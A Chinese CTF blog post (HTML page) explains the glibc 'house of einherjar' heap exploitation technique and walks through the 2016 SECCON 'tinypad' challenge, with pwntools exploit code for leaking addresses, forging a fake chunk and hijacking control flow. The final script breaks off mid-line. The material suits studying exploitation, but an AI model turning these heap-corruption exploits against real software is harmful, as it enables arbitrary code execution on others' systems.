<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>how2heap | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hoe2heap!!">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap">
<meta property="og:url" content="https://ixout.github.io/posts/49295/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="hoe2heap!!">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg">
<meta property="article:published_time" content="2023-08-19T09:34:54.000Z">
<meta property="article:modified_time" content="2023-11-04T14:12:41.632Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="how2heap">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/49295/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'how2heap',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-04 22:12:41'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">how2heap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-19T09:34:54.000Z" title="发表于 2023-08-19 17:34:54">2023-08-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-04T14:12:41.632Z" title="更新于 2023-11-04 22:12:41">2023-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（<strong>合并低地址的 chunk</strong>），从而使得尽可能避免碎片化。</p>
<p><strong>利用条件:</strong>off-by-one(可写下一chunk的prev_size与prev_inuse位)</p>
<p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk(要本身可写可控)</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>free函数向低地址chunk合并的操作如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>假设在内存由低到高有A与B两个chunk</p>
<p>且A能够改写B的prev_size与prev_inuse位</p>
<p><strong>unlink的chunk地址由以下代码决定</strong></p>
<p><code>p = chunk_at_offset(p, -((long) prevsize));</code></p>
<p>因为prevsize(<strong>有符号数</strong>)也是可控的</p>
<p>因此只需要在目标地址伪造fakechunk绕过unlink的检查即可</p>
<p><strong>完整性检查</strong>:难以找到存储&amp;A的内存,故选择fakechunk-&gt;fd=fakechunk-&gt;bk=fakechunk</p>
<p><strong>size检查:</strong>通过fakechunk的size字段找到的nextchunk的prev_size字段是否等于fakechunk的size</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png" alt=""></p>
<p>这样最后就能在unsortedbin中放入一个任意位置的chunk</p>
<p>不过这个chunk的size大概率无法通过unsorted取出时的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>
<p>因此还需要再次写这个chunk的size为一个合适且合法的值</p>
<h2 id="2-29新限制"><a href="#2-29新限制" class="headerlink" title="2.29新限制"></a>2.29新限制</h2><p>2.29向低地址合并操作代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现多了一个检测(通过prevsize找到的chunk的size<strong>?=</strong>prevsize)</p>
<p>这就使得fakechunk的size必须和prevsize相同,而这样的话fakechunk的nextchunk必然还是原本的chunk,这样常常会使得fakechunk的size过大,从而被视作largebin进而会多出一些操作</p>
<p>因此,2.29及以后fakechunk的size字段必须和本chunk的prevsize相同</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 Seccon tinypad</strong></p>
<p>保护pie没开</p>
<p>漏洞有off_by_null</p>
<p>个人第一想法其实是:没开pie且数据段上存放指针—-&gt;可以打unlink</p>
<p>写hook执行system(‘/bin/sh’)或onegadget</p>
<p>exp都快写好了,才发现一个致命的点———-写的时候长度是由strlen定的,malloc_hook默认是null,也就是说就算指向了malloc_hook也写不了</p>
<p>于是只能学习ctfwiki的做法了(其实如果按以上想法做根本就没用到house of einherjar的知识)</p>
<p>思路如下:</p>
<p>常规泄露heap地址,libc地址;并以此得到heap与tinypad的偏移,environ的符号地址,one_gadget等等</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br></pre></td></tr></table></figure>
<p>先申请四个chunk</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
<p>其中chunk2之所以要在尾部写p64(0x11))</p>
<p>是因为chunk2将用以free触发unlink,其后又会检测chunk2下一chunk的prev_inuse状态,写p64(0x11))用于off_by_null将chunk2的size改为0x100后继续维持后续chunk正常被寻找</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br></pre></td></tr></table></figure>
<p>释放chunk1再重新分配以off_by_null写chunk2的size和prev_size</p>
<p>并将fakechunk写在tinypad上,注意绕过unlink检查(自己做的时候这里犯了个蠢,fake_size用偏移offset填充,使得通过size找到的chunk为chunk2,这样是能够绕过部分检查,但offset的大小使得chunk被视作largebin从而unlink多了一部分检查nextsize链,而我又没填充nextsize域)</p>
<p><code>delete(2)</code>删除chunk2触发unlink使得tinypad被联入unsortedbin</p>
<p>此时fakechunk的大小显然不合规</p>
<p>于是</p>
<p><code>edit(4,b&#39;4&#39;*0x20+p64(0)+p64(0x101)+p64(libc.symbols[&#39;__malloc_hook&#39;]+0x10+0x58)*2)</code></p>
<p>将fakechunk的size改为能适中的大小</p>
<p>之后<code>add(0xf0,b&#39;2&#39;*0xd0+p64(666)+p64(environ)+b&#39;a&#39;*8+p64(0x602148))</code>将其申请出来并写memo1和memo2的指针</p>
<p>以此写main的返回地址</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">	p.sendline(<span class="string">b&#x27;Q&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	p.recv()</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	p.recvuntil(<span 